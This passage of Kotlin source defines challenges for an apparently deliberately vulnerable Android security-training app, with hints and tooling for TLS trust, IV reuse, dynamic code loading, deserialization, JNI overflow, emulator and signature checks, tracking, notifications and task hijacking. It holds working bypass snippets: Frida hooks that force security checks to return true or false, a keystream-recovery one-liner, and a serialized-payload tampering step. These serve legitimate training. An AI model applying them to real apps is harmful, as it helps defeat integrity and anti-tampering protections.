            cwe = "CWE-295", masvs = "NETWORK-1", maswe = "MASWE-0052", mastg = "MASTG-TEST-0021", cvss = "7.4 (High)",
            hints = listOf(
                "InsecureTlsClient.acceptServerCertificate() models an empty checkServerTrusted() implementation.",
                "Toggle HostnameVerifier to ALLOW_ALL so mismatched Subject CNs are accepted.",
                "Press 'Intercept TLS Handshake (MITM)' while ALLOW_ALL is enabled.",
            ),
            tooling = "// Audit APK for permissive TrustManagers & HostnameVerifiers:\n" +
                "jadx -d out app-debug.apk && grep -rn 'checkServerTrusted\\|ALLOW_ALL_HOSTNAME_VERIFIER' out/",
        ),
        Challenge(
            id = "ivreuse", title = "Static IV & Nonce Reuse",
            description = "Two ciphertexts encrypted under AES-CTR with a hardcoded zero IV leak the keystream.",
            difficulty = Difficulty.Hard, area = Area.Crypto,
            cwe = "CWE-329", masvs = "CRYPTO-1", maswe = "MASWE-0022", mastg = "MASTG-TEST-0014", cvss = "7.4 (High)",
            hints = listOf(
                "In stream/CTR modes, encrypting P1 and P2 with the same Key + IV gives C1 xor C2 = P1 xor P2.",
                "You know P1 (the greeting) and both ciphertexts C1 and C2.",
                "Paste C2 (hex) into the recovery field and press 'Recover Plaintext (C1 ⊕ P1 ⊕ C2)'.",
            ),
            tooling = "python3 -c 'c1=bytes.fromhex(\"<C1>\");c2=bytes.fromhex(\"<C2>\");p1=b\"GUEST_SESSION_HEADER_2026_pad_0000000\";print(bytes(a^b^c for a,b,c in zip(c1,p1,c2)).decode())'",
        ),
        Challenge(
            id = "dexload", title = "Unverified Dynamic Code Loading",
            description = "DexClassLoader loads plugin classes from writable storage without signature checks.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-494", masvs = "CODE-2", maswe = "MASWE-0084", mastg = "MASTG-TEST-0041", cvss = "8.4 (High)",
            hints = listOf(
                "PluginLoader reads dynamic_plugin.manifest from the writable cache directory.",
                "Find PluginLoader.EXPLOIT_ENTRY in DexLoadLab.kt.",
                "Set the target class name to com.evilcorp.plugin.DumpVaultPlugin and execute.",
            ),
            tooling = "// Frida: trace DexClassLoader / PathClassLoader loads\n" +
                "Java.perform(() => {\n" +
                "  const D = Java.use('dalvik.system.DexClassLoader');\n" +
                "  D.\$init.implementation = function (p, o, l, parent) {\n" +
                "    console.log('DexClassLoader path=' + p); return this.\$init(p, o, l, parent);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "serialization", title = "Unsafe Java Deserialization",
            description = "Untrusted Base64 Java ObjectInputStream restores a privileged SessionTokenParcel.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-502", masvs = "CODE-4", maswe = "MASWE-0080", mastg = "MASTG-TEST-0044", cvss = "8.1 (High)",
            hints = listOf(
                "Java serialized streams start with magic bytes 0xACED0005 (Base64 'rO0AB...').",
                "SessionTokenParcel has a boolean field isSuperAdmin at the end of the stream.",
                "Use the 'Generate serialized admin payload' helper (or flip the trailing 0x00 byte to 0x01) and deserialize.",
            ),
            tooling = "echo '<base64>' | base64 -d | xxd\n" +
                "# Change the trailing boolean byte 00 -> 01 and re-encode with base64",
        ),
        Challenge(
            id = "nativebridge", title = "JNI Stack Buffer Overflow",
            description = "Unbounded copy into a 16-byte JNI C stack buffer overwrites an adjacent privilege flag.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-120", masvs = "CODE-3", maswe = "MASWE-0076", mastg = "MASTG-TEST-0042", cvss = "8.4 (High)",
            hints = listOf(
                "struct jni_auth_frame places char username[16] immediately before uint8_t privileged.",
                "Any input longer than 16 ASCII characters spills into the 17th byte (offset 16).",
                "Enter 17+ characters (e.g. AAAAAAAAAAAAAAAAA) and invoke the JNI check.",
            ),
            tooling = "// Frida: intercept native JNI exports\n" +
                "Interceptor.attach(Module.findExportByName('libevilcorp_jni.so', 'Java_com_evilcorp_NativeBridge_verifyBadge'), {\n" +
                "  onEnter(args) { console.log('JNI call'); }\n" +
                "});",
        ),
        Challenge(
            id = "emulator", title = "Emulator Detection Bypass",
            description = "Provisioning key blocked when Build.HARDWARE and qemu indicators look like an AVD.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0099", mastg = "MASTG-TEST-0048", cvss = "4.3 (Medium)",
            hints = listOf(
                "Inspect EmulatorDetector.isEmulator() in EmulatorLab.kt.",
                "The check returns false when hardware equals 'qcom' or debug.evilcorp.real_device is 1.",
                "Set Reported Build.HARDWARE value to qcom (or run `adb shell setprop debug.evilcorp.real_device 1`).",
            ),
            tooling = "adb shell setprop debug.evilcorp.real_device 1\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.EmulatorDetector').isEmulator.implementation = () => false;\n" +
                "});",
        ),
        Challenge(
            id = "repackaging", title = "APK Signature & Installer Check",
            description = "Client-side signing certificate SHA-256 and Play Store installer check in bytecode.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-345", masvs = "RESILIENCE-3", maswe = "MASWE-0102", mastg = "MASTG-TEST-0045", cvss = "5.3 (Medium)",
            hints = listOf(
                "ApkSignatureVerifier.isOfficialBuild() checks OFFICIAL_CERT_SHA256 and EXPECTED_INSTALLER.",
                "Find both constants in RepackagingLab.kt via jadx.",
                "Set cert to E4:9A:2F:7C:10:B8:41:D3:99:06:CE:5E:8A:12:4F:77:AA:01:5C:33:8D:29:F0:6B:11:C4:7E:92:05:3B:D1:88 and installer to com.android.vending.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.ApkSignatureVerifier').isOfficialBuild.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "tracking", title = "Persistent Device Fingerprinting",
            description = "Analytics SDK harvests ANDROID_ID and hardware serials into a beacon after opt-out.",
            difficulty = Difficulty.Easy, area = Area.Privacy,
            cwe = "CWE-359", masvs = "PRIVACY-3", maswe = "MASWE-0110", mastg = "MASTG-TEST-0055", cvss = "5.3 (Medium)",
            hints = listOf(
                "Press 'Decline Tracking & Trigger SDK Init' to run the non-compliant tracker.",
                "The tracker writes files/telemetry_beacon.json even with consent_granted=false.",
                "Press 'Inspect Local Telemetry Spool' or run `adb shell run-as com.evilcorp.android cat files/telemetry_beacon.json`.",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/telemetry_beacon.json",
        ),
        Challenge(
            id = "notifications", title = "Public Lockscreen Notification Leak",
            description = "Wire approval 2FA OTP posted with VISIBILITY_PUBLIC and no redacted publicVersion.",
            difficulty = Difficulty.Easy, area = Area.Privacy,
            cwe = "CWE-200", masvs = "PRIVACY-2", maswe = "MASWE-0057", mastg = "MASTG-TEST-0010", cvss = "4.8 (Medium)",
            hints = listOf(
                "Notifications with VISIBILITY_PUBLIC display their full extras.TEXT on a locked screen.",
                "Press 'Send Wire Approval Push Notification' to inspect the unredacted notification record.",
                "Copy the EVILCORP{...} OTP token from extras.TEXT.",
            ),
            tooling = "adb shell dumpsys notification --noredact | grep -A10 com.evilcorp.android",
        ),
        Challenge(
            id = "strandhogg", title = "Task Affinity & Activity Hijack",
            description = "Non-empty taskAffinity with allowTaskReparenting lets a foreign activity hijack the stack.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-1021", masvs = "PLATFORM-3", maswe = "MASWE-0062", mastg = "MASTG-TEST-0031", cvss = "6.8 (Medium)",
            hints = listOf(
                "Keep taskAffinity set to com.evilcorp.android and allowTaskReparenting enabled.",
                "Press 'Launch App & Inspect ActivityManager Backstack' to observe the reparented activity.",
                "Set taskAffinity to empty and allowTaskReparenting to false to test the remediation.",
            ),
            tooling = "adb shell dumpsys activity activities | grep -E 'TaskRecord|Hist #'",
        ),
    )

    fun byId(id: String): Challenge? = all.firstOrNull { it.id == id }

    fun controlInfo(masvsId: String): MasvsControl? =
        masvsFamilies.asSequence().flatMap { it.controls }.firstOrNull { it.id == masvsId }
}
